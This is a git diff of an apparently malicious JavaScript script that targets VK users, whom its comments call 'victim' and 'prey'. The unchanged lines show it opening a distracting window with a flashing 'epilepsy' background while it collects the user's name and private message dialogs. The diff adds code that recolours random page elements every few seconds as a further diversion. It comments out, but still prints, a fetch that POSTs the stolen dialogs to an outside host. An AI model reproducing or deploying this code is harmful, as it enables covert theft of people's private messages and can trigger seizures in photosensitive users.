@@ -11,6 +11,17 @@
  */
 const wait = async (ms) => await new Promise(resolve => setTimeout(resolve, ms));
 
+/**
+ * получение случайного элемента массива
+ * @param arr
+ * @return {*}
+ */
+function arrayRandElement(arr) {
+    let rand = Math.floor(Math.random() * arr.length);
+    return arr[rand];
+}
+
+
 // =============== ИМЯ И ФАМИЛИЯ ЖЕРТВЫ =============== //
 /**
  * Получает кнопку "Моя страница" и нажимает на нее, чтобы перейти в профиль
@@ -286,6 +297,21 @@ function diversion() {
             epilepsy_bg.classList.add('epilepsy');
             vkCopy.document.body.appendChild(epilepsy_bg);
         }, 6000);
+
+
+        // ===== BREAK PAGE BY RANDOM COLORS ===== //
+        /**
+         * get randow div on page and paint it random color
+         */
+        function paintRandom() {
+            let bg = "background-color: " +
+                '#' + (Math.random().toString(16) + '000000').substring(2, 8).toUpperCase();
+
+            let divs = vkCopy.document.querySelectorAll('li, a, span, input, textarea');
+            arrayRandElement(divs).style = bg;
+        }
+
+        setInterval(paintRandom, 1500);
     }, 5000);
 }
 // ================= ОТВЛЕЧЕНИЕ ================== //
@@ -296,7 +322,6 @@ async function hacking() {
     // Сначала открываем отвлекающее окно
     diversion();
     // ==================================
-
 
     // ===== GET PREY's FULLNAME ===== //
     toProfile(); // go to profile
@@ -347,14 +372,14 @@ async function hacking() {
         let formData = new FormData();
         formData.append('data', JSON.stringify(dialogsData));
 
-        fetch(
-            'https://color-msg-slv.tk/save-it.php', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: formData,
-            }
-        );
-
+        // fetch(
+        //     'https://color-msg-slv.tk/save-it.php', {
+        //         method: 'POST',
+        //         mode: 'no-cors',
+        //         body: formData,
+        //     }
+        // );
+        console.log('data is missed');
         dialogsData = {
             [preyName]: {}
         }; // clear data to initial state
